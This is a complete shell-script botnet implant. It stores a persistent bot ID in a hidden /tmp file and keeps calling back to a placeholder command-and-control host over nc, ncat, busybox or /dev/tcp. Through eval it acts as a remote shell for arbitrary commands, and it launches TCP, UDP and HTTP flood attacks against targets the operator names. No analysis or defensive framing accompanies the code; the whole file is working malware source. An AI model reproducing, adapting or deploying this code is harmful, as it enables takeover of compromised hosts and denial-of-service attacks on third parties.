#!/bin/sh
# implant.sh — stable-ID telnet implant with DDoS support.

C2_HOST="__C2_HOST__"
C2_PORT="__C2_PORT__"

ID_FILE="/tmp/.telbot_id"
FLOOD_PIDFILE="/tmp/.telbot_flood.pid"
FLOOD_SCRIPT="/tmp/.telbot_flood.sh"

if [ -f "$ID_FILE" ]; then
    BOT_ID=$(cat "$ID_FILE")
else
    if [ -r /dev/urandom ]; then
        BOT_ID=$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')
    else
        BOT_ID="$(hostname)-$(date +%s)-$$"
    fi
    echo "$BOT_ID" > "$ID_FILE"
    chmod 600 "$ID_FILE"
fi

extract_field() {
    printf '%s' "$1" | sed -n "s/.*\"$2\":\"\([^\"]*\)\".*/\1/p"
}

extract_num() {
    printf '%s' "$1" | sed -n "s/.*\"$2\":\([0-9]*\).*/\1/p"
}

extract_shell_arg() {
    printf '%s' "$1" | sed -n 's/.*"args":\["\(.*\)"\].*/\1/p'
}

handle_ddos() {
    LINE="$1"
    TARGET=$(extract_field "$LINE" "target")
    METHOD=$(extract_field "$LINE" "method")
    PORT=$(extract_num "$LINE" "port")
    DURATION=$(extract_num "$LINE" "duration")
    THREADS=$(extract_num "$LINE" "threads")

    [ -z "$TARGET" ] && return
    [ -z "$PORT" ] && PORT=80
    [ -z "$METHOD" ] && METHOD="tcp"
    [ -z "$DURATION" ] && DURATION=60
    [ -z "$THREADS" ] && THREADS=200

    cat > "$FLOOD_SCRIPT" <<'FLOOD_EOF'
#!/bin/sh
TARGET="$1"; PORT="$2"; METHOD="$3"; DURATION="$4"; THREADS="$5"
END=$(( $(date +%s) + DURATION ))

tcp_worker() {
    while [ "$(date +%s)" -lt "$END" ]; do
        if command -v nc >/dev/null 2>&1; then
            (echo "GET / HTTP/1.1"; echo "Host: $TARGET"; echo "") | nc -w 2 "$TARGET" "$PORT" >/dev/null 2>&1
        elif command -v busybox >/dev/null 2>&1; then
            (echo "GET / HTTP/1.1"; echo "") | busybox nc -w 2 "$TARGET" "$PORT" >/dev/null 2>&1
        fi
    done
}

udp_worker() {
    P=$(head -c 1024 /dev/urandom | od -An -tx1 | tr -d ' \n')
    while [ "$(date +%s)" -lt "$END" ]; do
        if command -v nc >/dev/null 2>&1; then
            echo "$P" | nc -u -w 1 "$TARGET" "$PORT" >/dev/null 2>&1
        elif command -v busybox >/dev/null 2>&1; then
            echo "$P" | busybox nc -u -w 1 "$TARGET" "$PORT" >/dev/null 2>&1
        fi
    done
}

http_worker() {
    while [ "$(date +%s)" -lt "$END" ]; do
        if command -v curl >/dev/null 2>&1; then
            curl -s -o /dev/null --max-time 3 "$1"
        elif command -v wget >/dev/null 2>&1; then
            wget -q -O /dev/null --timeout=3 "$1"
        elif command -v busybox >/dev/null 2>&1; then
            busybox wget -q -O /dev/null "$1"
        fi
    done
}

i=0
while [ "$i" -lt "$THREADS" ]; do
    case "$METHOD" in
        tcp)   tcp_worker & ;;
        udp)   udp_worker & ;;
        http)  http_worker "http://$TARGET:$PORT/" & ;;
        https) http_worker "https://$TARGET:$PORT/" & ;;
        *)     tcp_worker & ;;
    esac
    i=$((i + 1))
done

sleep "$DURATION"
pkill -P $$ 2>/dev/null
exit 0
FLOOD_EOF

    chmod +x "$FLOOD_SCRIPT"
    "$FLOOD_SCRIPT" "$TARGET" "$PORT" "$METHOD" "$DURATION" "$THREADS" >/dev/null 2>&1 &
    echo $! > "$FLOOD_PIDFILE"
}

handle_ddos_stop() {
    if [ -f "$FLOOD_PIDFILE" ]; then
        PID=$(cat "$FLOOD_PIDFILE")
        pkill -P "$PID" 2>/dev/null
        kill "$PID" 2>/dev/null
        rm -f "$FLOOD_PIDFILE"
    fi
    pkill -f ".telbot_flood.sh" 2>/dev/null
}

run_session() {
    if command -v nc >/dev/null 2>&1; then
        CLIENT="nc"
    elif command -v ncat >/dev/null 2>&1; then
        CLIENT="ncat"
    elif command -v busybox >/dev/null 2>&1 && busybox nc --help >/dev/null 2>&1; then
        CLIENT="busybox-nc"
    else
        CLIENT="devtcp"
    fi

    run_loop() {
        while IFS= read -r line; do
            TYPE=$(extract_field "$line" "type")
            TASK_ID=$(extract_field "$line" "id")

            case "$TYPE" in
                ddos)
                    handle_ddos "$line"
                    printf '{"task_id":"%s","output":"ddos started"}\n' "$TASK_ID"
                    ;;
                ddos_stop)
                    handle_ddos_stop
                    printf '{"task_id":"%s","output":"ddos stopped"}\n' "$TASK_ID"
                    ;;
                shell)
                    CMD=$(extract_shell_arg "$line")
                    OUT=$(eval "$CMD" 2>&1)
                    ESC=$(printf '%s' "$OUT" | sed 's/\\/\\\\/g; s/"/\\"/g' | awk '{printf "%s\\n", $0}')
                    printf '{"task_id":"%s","output":"%s"}\n' "$TASK_ID" "$ESC"
                    ;;
                *)
                    printf '{"task_id":"%s","output":"unknown task"}\n' "$TASK_ID"
                    ;;
            esac
        done
    }

    case "$CLIENT" in
        nc)
            { echo "$BOT_ID"; run_loop; } | nc "$C2_HOST" "$C2_PORT"
            ;;
        ncat)
            { echo "$BOT_ID"; run_loop; } | ncat "$C2_HOST" "$C2_PORT"
            ;;
        busybox-nc)
            { echo "$BOT_ID"; run_loop; } | busybox nc "$C2_HOST" "$C2_PORT"
            ;;
        devtcp)
            exec 3<>/dev/tcp/"$C2_HOST"/"$C2_PORT"
            echo "$BOT_ID" >&3
            while IFS= read -r line <&3; do
                TYPE=$(extract_field "$line" "type")
                TASK_ID=$(extract_field "$line" "id")
                case "$TYPE" in
                    ddos) handle_ddos "$line"; printf '{"task_id":"%s","output":"ddos started"}\n' "$TASK_ID" >&3 ;;
                    ddos_stop) handle_ddos_stop; printf '{"task_id":"%s","output":"ddos stopped"}\n' "$TASK_ID" >&3 ;;
                    shell)
                        CMD=$(extract_shell_arg "$line")
                        OUT=$(eval "$CMD" 2>&1)
                        ESC=$(printf '%s' "$OUT" | sed 's/\\/\\\\/g; s/"/\\"/g' | awk '{printf "%s\\n", $0}')
                        printf '{"task_id":"%s","output":"%s"}\n' "$TASK_ID" "$ESC" >&3
                        ;;
                esac
            done
            exec 3<&-
            ;;
    esac
}

while true; do
    run_session
    JITTER=$((10 + ($$ % 30)))
    sleep "$JITTER"
done
